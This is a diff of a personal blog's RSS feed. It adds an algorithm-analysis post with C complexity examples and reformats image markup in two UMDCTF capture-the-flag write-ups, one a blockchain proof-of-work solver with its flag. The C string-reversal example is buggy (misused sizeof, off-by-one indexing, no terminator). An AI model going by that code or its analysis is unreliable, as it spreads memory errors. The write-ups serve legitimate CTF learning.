@@ -6,77 +6,122 @@
         <description>Recent content on Yojan&#39;s Blog</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Sun, 06 Mar 2022 19:12:41 -0500</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Tue, 04 Oct 2022 19:45:01 -0400</lastBuildDate><atom:link href="/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Algorithm Analysis</title>
+        <link>/p/algorithm-analysis/</link>
+        <pubDate>Tue, 04 Oct 2022 19:45:01 -0400</pubDate>
+        
+        <guid>/p/algorithm-analysis/</guid>
+        <description>&lt;h1 id=&#34;analyzing-algorithm&#34;&gt;Analyzing Algorithm&lt;/h1&gt;
+&lt;p&gt;An algorithm is a finite sequence of rigorous instructions, typically used to solve a specific problem. Some of the important question that might arise is, Why do we need algorithm? And What is algorithm analysis?&lt;/p&gt;
+&lt;p&gt;Algorithm allows one to define how certain function works. For example, we want to add a value to a [[Data structure]]. We would need to find the most efficient way to add it to the data structure. Algorithm analysis allows us to figure out how efficient an algorithm is.&lt;/p&gt;
+&lt;h2 id=&#34;complexities&#34;&gt;Complexities&lt;/h2&gt;
+&lt;p&gt;For a given algorithm, there are three types of complexities:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Time-Complexity: How much time it would take for an algorithm to perform a certain task.&lt;/li&gt;
+&lt;li&gt;Space-Complexity: How much storage/memory would an algorithm use to perform the given task.&lt;/li&gt;
+&lt;li&gt;Implementation-Complexity: How hard is it for us to code the given algorithm.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;modeling-time-complexity&#34;&gt;Modeling Time Complexity&lt;/h2&gt;
+&lt;p&gt;We represent complexity as a function of the input. While referring to time complexity, we use T(n) where n in the input size. Let&amp;rsquo;s look at some sample examples.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;decimalToBinary&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;decValue&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;binString&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[])&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;count&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;tempArry&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;decValue&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;n&#34;&gt;tempArry&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;count&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sc&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;n&#34;&gt;count&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;For the above function, the time complexity will be O(log n). If we say that decValue is n, then in every increment the decValue will be halved.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;reverse&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[]){&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;reversed&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;malloc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;sizeof&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;sizeof&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;--&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;n&#34;&gt;reversed&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;n&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;reversed&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Well, let&amp;rsquo;s see how we can look at individual line, and model a more accurate model. To do that we generally use T(n) where n in the input of the function and T is the time total run time.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;reversed&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;malloc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;sizeof&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;j&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;For these, we can say that the T(n) = 1 for each. Then the total will be T(n) = 3.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;sizeof&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;--&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;n&#34;&gt;reversed&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;n&#34;&gt;j&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Here we will need to split up the code a bit more&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;sizeof&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;i = sizeof(string)&lt;/code&gt; will be T(n) = 1
+&lt;code&gt;i&amp;gt;0&lt;/code&gt; will run for &lt;code&gt;i+1&lt;/code&gt; number of times, so the time complexity for that will be T(n)= n+1
+finally the &lt;code&gt;i--&lt;/code&gt; will run for &lt;code&gt;i&lt;/code&gt; number of times resulting in time complexity of T(n) = n.
+Adding them up will give T(n) = 2n+2 Next, is the interior part.
+There are two lines inside which will run &lt;code&gt;n&lt;/code&gt; number of times, and the T(n) = n.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;To summarize&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Outside the for loop, the T(n) = 3.&lt;/li&gt;
+&lt;li&gt;The for loop overhead T(n) = 2n+2&lt;/li&gt;
+&lt;li&gt;Inside the for loop T(n) = n&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Adding them all up, we get the time complexity of
+T(n) = 3n+5&lt;/p&gt;
+&lt;p&gt;Now that we have the specific time complexity for it, we can simplify the bounding function by keeping the most dominant factor. For this example it is 3n, then we can remove any constant and get the Big-O notation. Which will be O(n).&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>UMDCTF: Block ChainV2 - Chungus Coin</title>
         <link>/p/umdctf-block-chainv2-chungus-coin/</link>
         <pubDate>Sun, 06 Mar 2022 19:12:41 -0500</pubDate>
         
         <guid>/p/umdctf-block-chainv2-chungus-coin/</guid>
-        <description>&lt;img src="/UMDCTF/UMDCTF.png" alt="Featured image of post UMDCTF: Block ChainV2 - Chungus Coin" /&gt;&lt;p&gt;&lt;figure 
-	&gt;
-	&lt;a href=&#34;/UMDCTF/ChungusCoin/Pasted%20image%2020220306151519.png&#34; &gt;
-		&lt;img src=&#34;/UMDCTF/ChungusCoin/Pasted%20image%2020220306151519.png&#34;
-			
-			
-			
-			loading=&#34;lazy&#34;
-			&gt;
-	&lt;/a&gt;
+        <description>&lt;img src="/UMDCTF/UMDCTF.png" alt="Featured image of post UMDCTF: Block ChainV2 - Chungus Coin" /&gt;&lt;p&gt;&lt;img src=&#34;/UMDCTF/ChungusCoin/Pasted%20image%2020220306151519.png&#34;
 	
-&lt;/figure&gt;
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;
 For this challenge we were provided with the server.py with stuffs redacted.&lt;/p&gt;
 &lt;p&gt;They made their own coin called ChungusCoin, this challenge was combination of reverse engineering and bitcoin.&lt;/p&gt;
 &lt;p&gt;As usual, starting the challenge out by analyzing the code that was provided.
-&lt;figure 
-	&gt;
-	&lt;a href=&#34;/UMDCTF/ChungusCoin/Pasted%20image%2020220306151923.png&#34; &gt;
-		&lt;img src=&#34;/UMDCTF/ChungusCoin/Pasted%20image%2020220306151923.png&#34;
-			
-			
-			
-			loading=&#34;lazy&#34;
-			&gt;
-	&lt;/a&gt;
+&lt;img src=&#34;/UMDCTF/ChungusCoin/Pasted%20image%2020220306151923.png&#34;
 	
-&lt;/figure&gt;
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;
 There is a lot going in the code. The description of the challenge says it&amp;rsquo;s for people who know how to mine. So, time to figure out how to mine this code.&lt;/p&gt;
 &lt;p&gt;There are few routes in the flask servers
-&lt;figure 
-	&gt;
-	&lt;a href=&#34;/UMDCTF/ChungusCoin/Pasted%20image%2020220306152435.png&#34; &gt;
-		&lt;img src=&#34;/UMDCTF/ChungusCoin/Pasted%20image%2020220306152435.png&#34;
-			
-			
-			
-			loading=&#34;lazy&#34;
-			&gt;
-	&lt;/a&gt;
+&lt;img src=&#34;/UMDCTF/ChungusCoin/Pasted%20image%2020220306152435.png&#34;
 	
-&lt;/figure&gt;&lt;/p&gt;
-&lt;p&gt;&lt;figure 
-	&gt;
-	&lt;a href=&#34;/UMDCTF/ChungusCoin/Pasted%20image%2020220306152509.png&#34; &gt;
-		&lt;img src=&#34;/UMDCTF/ChungusCoin/Pasted%20image%2020220306152509.png&#34;
-			
-			
-			
-			loading=&#34;lazy&#34;
-			&gt;
-	&lt;/a&gt;
 	
-&lt;/figure&gt;
-&lt;figure 
-	&gt;
-	&lt;a href=&#34;/UMDCTF/ChungusCoin/Pasted%20image%2020220306152553.png&#34; &gt;
-		&lt;img src=&#34;/UMDCTF/ChungusCoin/Pasted%20image%2020220306152553.png&#34;
-			
-			
-			
-			loading=&#34;lazy&#34;
-			&gt;
-	&lt;/a&gt;
 	
-&lt;/figure&gt;&lt;/p&gt;
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/UMDCTF/ChungusCoin/Pasted%20image%2020220306152509.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;
+&lt;img src=&#34;/UMDCTF/ChungusCoin/Pasted%20image%2020220306152553.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
 &lt;p&gt;I think for this challenge we have to compute hash of previous block, do some proof of work, then add the pending transaction to the chain. This will then return the flag.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;requests&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;hashlib&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sha256&lt;/span&gt;
@@ -126,18 +171,14 @@ Explaining everything will take forever, here is a quick overview:&lt;/p&gt;
 &lt;em&gt;&lt;strong&gt;new_block&lt;/strong&gt;&lt;/em&gt;: it creates a new block by hashing previous block, adding one to the index, and getting the proof of work from the proof_of_work function.
 &lt;em&gt;&lt;strong&gt;update_chain&lt;/strong&gt;&lt;/em&gt;: it takes in new_block and appends it to the chain, and send a post request to update the chain in the block chain server.&lt;/p&gt;
 &lt;p&gt;Running the script will compute proof_of_work and append the transaction to server and return the flag.&lt;/p&gt;
-&lt;p&gt;&lt;figure 
-	&gt;
-	&lt;a href=&#34;/UMDCTF/ChungusCoin/Solver.gif&#34; &gt;
-		&lt;img src=&#34;/UMDCTF/ChungusCoin/Solver.gif&#34;
-			
-			
-			
-			loading=&#34;lazy&#34;
-			&gt;
-	&lt;/a&gt;
+&lt;p&gt;&lt;img src=&#34;/UMDCTF/ChungusCoin/Solver.gif&#34;
 	
-&lt;/figure&gt;&lt;/p&gt;
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;UMDCTF&lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;Chungus_Th4nk5_y0u_f0r_y0ur_bl0ckch41n_s3rv!c3&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
         </item>
@@ -147,156 +188,129 @@ Explaining everything will take forever, here is a quick overview:&lt;/p&gt;
         <pubDate>Sun, 06 Mar 2022 19:09:57 -0500</pubDate>
         
         <guid>/p/umdctf-customer-support/</guid>
-        <description>&lt;img src="/UMDCTF/UMDCTF.png" alt="Featured image of post UMDCTF: Customer Support" /&gt;&lt;p&gt;&lt;figure 
-	&gt;
-	&lt;a href=&#34;/UMDCTF/CustomerSupport/Pasted%20image%2020220306144115.png&#34; &gt;
-		&lt;img src=&#34;/UMDCTF/CustomerSupport/Pasted%20image%2020220306144115.png&#34;
-			
-			
-			
-			loading=&#34;lazy&#34;
-			&gt;
-	&lt;/a&gt;
+        <description>&lt;img src="/UMDCTF/UMDCTF.png" alt="Featured image of post UMDCTF: Customer Support" /&gt;&lt;p&gt;&lt;img src=&#34;/UMDCTF/CustomerSupport/Pasted%20image%2020220306144115.png&#34;
 	
-&lt;/figure&gt;&lt;/p&gt;
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
 &lt;p&gt;For this challenge we were given
-&lt;figure 
-	&gt;
-	&lt;a href=&#34;/UMDCTF/CustomerSupport/Pasted%20image%2020220306144230.png&#34; &gt;
-		&lt;img src=&#34;/UMDCTF/CustomerSupport/Pasted%20image%2020220306144230.png&#34;
-			
-			
-			
-			loading=&#34;lazy&#34;
-			&gt;
-	&lt;/a&gt;
+&lt;img src=&#34;/UMDCTF/CustomerSupport/Pasted%20image%2020220306144230.png&#34;
 	
-&lt;/figure&gt;
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;
 So I stared out by opening the Dockerfile
-&lt;figure 
-	&gt;
-	&lt;a href=&#34;/UMDCTF/CustomerSupport/Pasted%20image%2020220306144325.png&#34; &gt;
-		&lt;img src=&#34;/UMDCTF/CustomerSupport/Pasted%20image%2020220306144325.png&#34;
-			
-			
-			
-			loading=&#34;lazy&#34;
-			&gt;
-	&lt;/a&gt;
+&lt;img src=&#34;/UMDCTF/CustomerSupport/Pasted%20image%2020220306144325.png&#34;
 	
-&lt;/figure&gt;
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;
 In the docker file we can see the starting command is &lt;code&gt;npm run startall&lt;/code&gt;
-&lt;figure 
-	&gt;
-	&lt;a href=&#34;/UMDCTF/CustomerSupport/Pasted%20image%2020220306144449.png&#34; &gt;
-		&lt;img src=&#34;/UMDCTF/CustomerSupport/Pasted%20image%2020220306144449.png&#34;
-			
-			
-			
-			loading=&#34;lazy&#34;
-			&gt;
-	&lt;/a&gt;
+&lt;img src=&#34;/UMDCTF/CustomerSupport/Pasted%20image%2020220306144449.png&#34;
 	
-&lt;/figure&gt;
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;
 Looking at the package.json we can see two service being started with start all script.&lt;/p&gt;
-&lt;p&gt;&lt;figure 
-	&gt;
-	&lt;a href=&#34;/UMDCTF/CustomerSupport/Pasted%20image%2020220306144621.png&#34; &gt;
-		&lt;img src=&#34;/UMDCTF/CustomerSupport/Pasted%20image%2020220306144621.png&#34;
-			
-			
-			
-			loading=&#34;lazy&#34;
-			&gt;
-	&lt;/a&gt;
+&lt;p&gt;&lt;img src=&#34;/UMDCTF/CustomerSupport/Pasted%20image%2020220306144621.png&#34;
 	
-&lt;/figure&gt;
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;
 In app.js inside microservice we can see two path that returns token.
-&lt;figure 
-	&gt;
-	&lt;a href=&#34;/UMDCTF/CustomerSupport/Pasted%20image%2020220306144728.png&#34; &gt;
-		&lt;img src=&#34;/UMDCTF/CustomerSupport/Pasted%20image%2020220306144728.png&#34;
-			
-			
-			
-			loading=&#34;lazy&#34;
-			&gt;
-	&lt;/a&gt;
+&lt;img src=&#34;/UMDCTF/CustomerSupport/Pasted%20image%2020220306144728.png&#34;
 	
-&lt;/figure&gt;
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;
 This microservice is running in port 3001. The first thing that I tried to do was open that port, but i couldn&amp;rsquo;t access it.
 &lt;em&gt;Time for more code analysis&lt;/em&gt;
-&lt;figure 
-	&gt;
